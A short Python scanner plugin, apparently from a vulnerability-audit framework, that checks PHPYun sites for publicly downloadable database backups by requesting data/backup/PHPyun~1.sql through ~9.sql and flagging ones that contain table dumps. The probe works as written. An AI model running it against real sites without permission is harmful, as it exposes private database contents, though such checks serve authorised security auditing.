#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = phpyun

def assign(service, arg):
	if service == 'phpyun':
		return True, arg

def audit(arg):
    #http://www.wooyun.org/bugs/wooyun-2010-096528
    #可下载数据库备份
    for i in range(1,10):
        payload = "data/backup/PHPyun~%d.sql" % i
        target = arg + payload
        code, head, body, errcode, final_url = curl.curl2(target);
        if code == 200 and '#dbname:' in body and 'CREATE TABLE' in body:
            security_warning(target)
            break

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpyun', 'http://127.0.0.1/phpyun/')[1])